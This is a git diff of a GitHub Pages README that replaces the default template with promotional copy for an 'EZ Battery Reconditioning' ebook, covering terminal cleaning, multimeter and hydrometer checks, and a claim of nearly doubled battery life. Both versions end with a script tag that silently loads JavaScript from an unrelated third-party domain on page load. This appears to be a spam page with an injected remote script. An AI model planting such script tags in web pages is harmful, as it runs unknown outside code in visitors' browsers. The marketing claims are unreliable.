@@ -1,38 +1,17 @@
-## Welcome to GitHub Pages
+What is Ez Battery Reconditioning Program?
+EZ Battery Reconditioning is a 10-20 minute method of bringing new life into the batteries you already own. Using simple tools such as a multi-meter you will be able to test your batteries, revive those that are underperforming, and nearly double the lifespan one gets out of the average car, golf cart or medical home battery. This method developed by Tom Ericson has helped keep thousands of cars and other devices running and kept their battery pollutants out of the landfill.
 
-You can use the [editor on GitHub](https://github.com/linuxdcx/ez/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Let’s break it down:
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Many cars, golf carts and other devices run on so called wet-cell, lead-acid cell batteries. This means that typically a plate of lead is immersed in sulfuric acid, resulting in a reaction that creates electricity. Over time corrosive processes that are natural to the battery can result in decreased performance and lead to decreased voltage.
+This decreased voltage can lead many to believe their battery is dead and needing to be replaced. The resulting trip for a new battery can be a painful one, as the costs and work for a replacement can be huge endeavor.
 
-### Markdown
+How EZ Battery Reconditioning Program Works?
+The EZ Battery Reconditioning program outlines simple common sense steps to rejuvenating your battery. To start, one must safely remove their battery from the device and disconnect all power to the battery. Gloves and eye protection are a must, as well as making sure the environment you are working in is secure and dry.
+The first step towards reconditioning a battery is cleaning the contacts, or terminals, on the battery. These positive and negative terminals over the years will build up residue that needs to be cleaned with steel wool or other abrasive brushes in order to maintain a good contact point. Without good contact voltage can be lacking or inconsistent with the result being decreased power in starting or running your car.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Ok so I have done this, what’s the next step?
+For the next step, a cheap multimeter (sometimes called a volt-meter) and a hydrometer are required. A hydrometer is a device used for measuring the density of liquids. Due to lead-acid batteries containing fluid, it’s important to check the fluid density of the cell to ensure that the cell is performing correctly. A multimeter is a device used to check voltage readings from the battery. After undergoing the steps outlined in the ebook you will check the voltage to see if the battery is performing correctly. Both the multimeter and hydrometer can be obtained cheaply from online or home improvement stores.
 
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/linuxdcx/ez/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
-<script type="text/javascript" src="https://app.elleidea.com/cf.js?un=30849203789784534555" async="async"></script>
+The first step is checking the terminals to make sure the output is consistent with what your battery should read. Using the EZ Battery Reconditioning guide you will be able to then check each cell’s electrolyte level with a hydrometer to make sure each cell is performing adequately. It’s important to note at this point any concerns to each individual cell such as bulging and cracking, and the guide helpfully outlines what to look for. Safety is a must when measuring the cells so always wear your personal protective gear mentioned above during this process
+<script type="text/javascript" src="https://app.elleidea.com/cf.js" async="async"></script>
